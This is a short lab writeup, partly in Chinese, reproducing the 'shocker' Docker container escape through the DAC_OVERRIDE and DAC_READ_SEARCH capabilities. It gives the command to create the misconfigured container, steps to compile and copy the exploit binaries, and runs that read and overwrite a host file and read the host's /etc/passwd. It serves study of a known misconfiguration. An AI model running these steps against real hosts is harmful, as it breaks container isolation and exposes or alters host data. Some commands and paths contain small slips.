# DAC override writeup

## Env
- Ubuntu 23.10 x86_64
- AMD Ryzen 5 5600X (4) @ 3.700GH
- 16GB
```
Client: Docker Engine - Community
 Version:           26.0.0
 API version:       1.45
 Go version:        go1.21.8
 Git commit:        2ae903e
 Built:             Wed Mar 20 15:17:56 2024
 OS/Arch:           linux/amd64
 Context:           default

Server: Docker Engine - Community
 Engine:
  Version:          26.0.0
  API version:      1.45 (minimum version 1.24)
  Go version:       go1.21.8
  Git commit:       8b79278
  Built:            Wed Mar 20 15:17:56 2024
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.28
  GitCommit:        ae07eda36dd25f8a1b98dfbf587313b99c0190bb
 runc:
  Version:          1.1.12
  GitCommit:        v1.1.12-0-g51d5e94
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

Host上有一个`secret.txt`,内容为:
```
Simply a file from the host
```


## Steps

创建容器
```shell
sudo docker run -it --rm --cap-drop=ALL --cap-add=DAC_OVERRIDE --cap-add=DAC_READ_SEARCH --cap-add=CHOWN --cap-add=SETGID --cap-add=SETUID --cap-add=FOWNER --name=DAC ubuntu bash
```

编译exp
```shell
gcc -o read shocker.c
gcc -o write shocker_write.c
```

cp进二进制文件
```shell
sudo docker cp ./read DAC:/read
sudo docker cp ./write DAC:/write
```

进入容器
```shell
sudo docker -exec -itd DAC /bin/bash
```

尝试读取host上的secret文件:
```shell
./read "/home/ebpf/container-escape-exploits/misconfig/DAC override/secret.txt" "sec.txt"
```

运行完成
![OgdvMX.png](https://ooo.0x0.ooo/2024/03/26/OgdvMX.png)

读取文件内容在`sec.txt`内

![Ogdy7t.png](https://ooo.0x0.ooo/2024/03/26/Ogdy7t.png)

尝试写入secret文件. 容器内有一个`pad.txt`文件:
```
Hacked!
```

```shell
./write "/home/ebpf/container-escape-exploits/misconfig/DAC override/secret.txt" "pad.txt"
```

![OgdmXj.png](https://ooo.0x0.ooo/2024/03/26/OgdmXj.png)

写入成功

![OgdPPU.png](https://ooo.0x0.ooo/2024/03/26/OgdPPU.png)

## Shell

```shell
./read "/etc/passwd" "sec.txt" 
./write "/home/ubuntu/container-escape-exploits/misconfig/DAC override/secrect.txt" "pad.txt"
```